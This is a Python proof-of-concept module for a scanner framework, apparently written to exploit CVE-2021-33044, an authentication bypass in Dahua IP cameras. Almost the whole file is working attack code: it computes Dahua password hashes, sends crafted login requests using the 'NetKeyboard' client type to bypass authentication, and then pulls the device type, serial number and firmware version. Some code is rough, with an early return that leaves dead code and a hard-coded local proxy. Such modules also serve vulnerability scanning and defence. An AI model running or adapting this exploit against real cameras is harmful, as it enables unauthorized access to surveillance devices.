"""
@Name: v_2022_0013_dahua_tf.py
@Auth: zhangzh
@Date: 2022-11-08
@Desc:
"""
import hashlib
from urllib.parse import urljoin

import requests

from BasePoc import BasePoc


def _compressor(in_var, out):
    """ From: https://github.com/haicen/DahuaHashCreator/blob/master/DahuaHash.py """
    i = 0
    j = 0

    while i < len(in_var):
        out[j] = (in_var[i] + in_var[i + 1]) % 62
        if out[j] < 10:
            out[j] += 48
        elif out[j] < 36:
            out[j] += 55
        else:
            out[j] += 61

        i = i + 2
        j = j + 1


def dahua_gen1_hash(password):
    """ From: https://github.com/haicen/DahuaHashCreator/blob/master/DahuaHash.py """
    m = hashlib.md5()
    m.update(password.encode("latin-1"))

    s = m.digest()
    crypt = []
    for b in s:
        crypt.append(b)

    out2 = [''] * 8
    _compressor(crypt, out2)
    dh_data = ''.join([chr(c) for c in out2])

    return dh_data


def dahua_gen2_md5_hash(
        dh_random=None, dh_realm=None, username=None, password=None, saved_host=None, return_hash=False):
    """ Dahua (gen2) DHIP/WEB random MD5 password hash """

    dh_hash = saved_host.get('password').get('gen2') if password is None else hashlib.md5(
        (username + ':' + dh_realm + ':' + password).encode('latin-1')
    ).hexdigest().upper()

    if return_hash:
        return dh_hash

    return hashlib.md5(
        (username + ':' + dh_random + ':' + dh_hash).encode('latin-1')
    ).hexdigest().upper()


POC_NAME = "POC"


class POC(BasePoc):
    # poc信息
    poc_info = {
        'Id': 'GDV-2022-1184',  # poc编号，与文件名保持一致
        'Name': 'Dahua IPC 授权问题漏洞',  # 漏洞名称必须与文件名一致；一般为CNNVD漏洞率名称；尽量避免特殊字符，空格使用_代替
        'Author': 'zhangzh',  # poc作者
        'Create_date': '2022-11-08',  # poc创建时间：如'2022-11-02'
        'Port': [],  # 说明该poc可能使用的端口
        'Service': 'Dahua'  # POC扫描漏洞所属厂商
    }

    vul_info = {
        'Product': 'Dahua IPC',  # 漏洞所在产品名称
        'Version': None,  # 产品的版本号
        'Type': '权限绕过',  # 漏洞类型
        'Level': '超危',  # 危害级别
        'CVE': 'CVE-2021-33044',  # 漏洞CVE编号
        'CNNVD': 'CNNVD-202109-1080',  # 漏洞CNNVD编号
        'CNVD': 'CNVD-2021-103421',  # 漏洞CNVD编号
        'Description': 'Dahua IPC是中国大华（Dahua）公司的大华的一系列工控机。'
                       'Dahua IPC存在安全漏洞，攻击者可利用该漏洞通过构造恶意数据包绕过设备身份验证',  # 漏洞描述
        'DisclosureDate': '2021-09-15',  # 漏洞公布时间：如'2014-11-19'
    }

    scan_info = {
        'Id': '',  # POC id
        'Target': '',  # 目标网站域名
        'Port': '80',  # 目标端口
        'Mode': 'verify',  # verify、exploit、test# ， 默认值为verify
        'Error': '',  # 记录poc失败信息
        'Success': False,  # 是否执行成功，默认值为False表示poc执行不成功，若成功请更新该值为True
        'Timeout': 10,  # 用于POC相关请求的超时设置
        'Other': {}  # 记录额外的poc相关信息
    }

    def __init__(self):
        self.remote = requests.Session()
        self.id = 1
        self.session = 0

    def dahua_logon(self, query_args=None, username=None, password=None):
        password_type = {
            "Plain": "Plain",
            "Basic": "Basic",
            "OldDigest": "OldDigest",
            "Default": "Default",
            "Onvif": "Onvif",
            "2DCode": "2DCode"  # params.code
        }
        authority_type = {
            "Plain": "Plain",
            "Basic": "Basic",
            "OldDigest": "OldDigest",
            "Default": "Default",
            "Onvif": "Onvif",
            "2DCode": "2DCode",  # params.code
            "Ushield": "Ushield"
        }
        query_args = query_args.get('params')

        dh_random = query_args.get('random')
        dh_realm = query_args.get('realm')
        encryption = query_args.get('encryption')
        params = {
            "userName": username,
            "ipAddr": "127.0.0.1",
            "loginType": "Direct",
            "clientType": "Console",
            "authorityType": authority_type.get(encryption),  # Default, OldDigest
            "passwordType": password_type.get(encryption),  # Default, Plain

        }
        if encryption == "OldDigest":
            params.update({
                "passwordType": "OldDigest",
                "password": dahua_gen1_hash(password)
            })
        elif encryption == "Default":
            dh_hash = dahua_gen2_md5_hash(
                username=username, password=password, dh_realm=dh_realm, dh_random=dh_random)

            params.update({
                "passwordType": "Default",
                "password": dh_hash
            })
        params.update({
            "clientType": "NetKeyboard"
        })
        return params

    def get_version(self):
        try:
            self.id += 1
            query_args = {
                "method": "magicBox.getProductDefinition",
                "params": None,
                "id": self.id,
                "session": self.session
            }
            url = urljoin(self.url, "RPC2")
            dh_data = self.remote.post(url, json=query_args, verify=False, allow_redirects=False,
                                       timeout=(3, 3)).json()
            dev_data = dh_data.get("params", {}).get("definition", {})
            DevVersion = ""
            MajorVersion = dev_data.get("MajorVersion")
            MinorVersion = dev_data.get("MinorVersion")
            VendorAbbr = dev_data.get("VendorAbbr")
            OEMVersion = dev_data.get("OEMVersion")
            Revision = dev_data.get("Revision")
            TypeVersion = dev_data.get("TypeVersion")
            BuildDate = dev_data.get("BuildDate")

            if MajorVersion is not None:
                DevVersion += str(MajorVersion)
            if MinorVersion is not None:
                DevVersion += "." + str(MinorVersion)[:3]
            if VendorAbbr is not None:
                DevVersion += "." + str(VendorAbbr)[:2]
            if OEMVersion is not None:
                DevVersion += str(OEMVersion).rjust(2, '0')
            if Revision is not None:
                DevVersion += "." + str(Revision)
            if TypeVersion is not None:
                DevVersion += "." + str(TypeVersion)
            if BuildDate is not None:
                DevVersion += " Build Date: " + BuildDate
            return DevVersion
        except:
            pass

    def get_dev_type(self):
        try:
            self.id += 1
            query_args = {
                "method": "magicBox.getDeviceType",
                "params": None,
                "id": self.id,
                "session": self.session
            }
            url = urljoin(self.url, "RPC2")
            dh_data = self.remote.post(url, json=query_args, verify=False, allow_redirects=False,
                                       timeout=(3, 3))
            print(dh_data.content)
            return
            self.info = "通过参数'magicBox.getDeviceType'获取以下结果:\n" + str(dh_data)

            DevType = dh_data.get("params", {}).get("type", "")
            return DevType
        except Exception as e:
            print(e)

    def get_dev_class(self):
        try:
            self.id += 1
            query_args = {
                "method": "magicBox.getDeviceClass",
                "params": None,
                "id": self.id,
                "session": self.session
            }
            url = urljoin(self.url, "RPC2")
            dh_data = self.remote.post(url, json=query_args, verify=False, allow_redirects=False,
                                       timeout=(3, 3)).json()
            DevClass = dh_data.get("params", {}).get("type", "")
            if DevClass == "DVR":
                return 1
            elif DevClass == "DVS":
                return 2
            elif DevClass == "NVR":
                return 3
        except:
            pass
        return 4

    def get_dev_sn(self):
        try:
            self.id += 1
            query_args = {
                "method": "magicBox.getSerialNo",
                "params": None,
                "id": self.id,
                "session": self.session
            }
            url = urljoin(self.url, "RPC2")
            dh_data = self.remote.post(url, json=query_args, verify=False, allow_redirects=False,
                                       timeout=(3, 3)).json()
            DevSN = dh_data.get("params", {}).get("sn", "")
            return DevSN
        except:
            pass

    def verify(self):
        timeout = (3, 2)
        self.url = "http://{}:{}".format(self.scan_info['Target'], '80')
        self.remote.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'http://{}'.format(self.scan_info['Target']),
            'Origin': 'http://{}'.format(self.scan_info['Target']),
            'Host': '{}:{}'.format(self.scan_info['Target'], '80'),
        })
        url = urljoin(self.url, "RPC2_Login")
        query_args = {
            "method": "global.login",
            "params": {
                "userName": "admin",
                "password": "",
                "clientType": "Web3.0",
                "loginType": "Direct",
            },
            "id": self.id,
            "session": self.session
        }
        try:
            proxies = {
                'http': 'http://127.0.0.1:6666',
            }
            # 第一次请求 获取cookie
            dh_data = self.remote.post(url, json=query_args, verify=False, allow_redirects=False, proxies=proxies).json()
            self.session = dh_data.get("session")
            dh_realm = dh_data.get('params').get('realm')
            self.remote.cookies.set('username', query_args.get('params').get('userName'))
            self.remote.cookies.set('DWebClientSessionID', str(self.session))
            # 第二次请求
            if dh_data.get('error').get('code') in [268632079, 401]:
                self.id += 1
                query_args = {
                    "method": "global.login",
                    "params": {
                    },
                    "id": self.id,
                    "session": self.session
                }
                params = self.dahua_logon(query_args=dh_data, username="admin", password="admin")
                query_args.get('params').update(params)
                dh_data = self.remote.post(url, json=query_args, verify=False, allow_redirects=False, proxies=proxies).json()
                print(dh_data)
                if dh_data.get("result"):
                    self.scan_info['Success'] = True

                    DevType = self.get_dev_type()
                    if DevType:
                        self.scan_info['Other']['DevType'] = DevType
                    DevSN = self.get_dev_sn()
                    if DevSN:
                        self.scan_info['Other']['DevSN'] = DevSN
                    DevVersion = self.get_version()
                    if DevVersion:
                        self.scan_info['Other']['DevVersion'] = DevVersion
                    DevClass = self.get_dev_class()
                    if DevClass:
                        self.scan_info['Other']['DevClass'] = DevClass
                    if self.info:
                        self.scan_info['Other']['info'] = str(self.info)

        except Exception as e:
            self.scan_info['Other']['Error'] = e
